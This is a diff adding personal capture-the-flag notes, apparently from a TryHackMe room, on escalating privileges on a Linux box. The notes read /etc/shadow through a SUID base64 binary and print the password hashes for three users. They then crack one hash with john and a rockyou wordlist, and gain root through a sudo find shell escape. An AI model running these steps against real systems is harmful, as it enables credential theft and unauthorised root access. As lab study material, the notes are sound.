@@ -1,0 +1,39 @@
+1. kernel version = 3.10.0-1160.el7.x86_64
+
+2. searching for SUID bits 
+   found /usr/bin/base64 
+
+   so trying to find hash using base64 decoder
+   
+   1 -> making a variable and assiging a shadow folder path in it 
+        LFILE=/etc/shadow
+   
+   2 -> base64 "$LFILE" | base64 --decode 
+        the above command will decode it and find the hash for the user
+ 
+        dir in /home are (leonard,missy,rootflag)
+
+        found sha512crypt for root , leonard , messy 
+   
+        leonard:$6$JELumeiiJFPMFj3X$OXKY.N8LDHHTtF5Q/pTCsWbZtO6SfAzEQ6UkeFJy.Kx5C9rXFuPr.8n3v7TbZEttkGKCVj50KavJNAm7ZjRi4/::0:99999:7:::
+
+        missy:$6$BjOlWE21$HwuDvV1iSiySCNpA3Z9LxkxQEqUAdZvObTxJxMoCp/9zRVCi6/zrlMlAQPAxfwaD2JCUypk4HaNzI3rPVqKHb/:18785:0:99999:7:::
+
+        root:$6$DWBzMoiprTTJ4gbW$g0szmtfn3HYFQweUPpSUCgHXZLzVii5o6PM0Q2oMmaDD9oGUSxe1yvKbnYsaSYHrUEQXTjIwOW/yrzV5HtIL51::0:99999:7:::
+
+    3 -> using john to crack the password of missy
+         SYNTAX : john hash1.txt -format=sha512crypt -wordlist=~/Tryhackme/List_For_Enumeration/wordlists/rockyou.txt
+         Found Password : Password1
+
+
+3. Now we have a found the password of missy we will login in it and try to find the flag1.txt and try to escalate the priviliges 
+   
+   trying to SUID bit files and it we the same as leonard nothing new
+   
+   using sudo -l command I found that find command can we run using sudo with NOPASSWD so 
+
+   SYNTAX : sudo find . -exec /bin/sh \; -quit 
+
+   WE  GOT  ROOT  ACCESS 
+
+
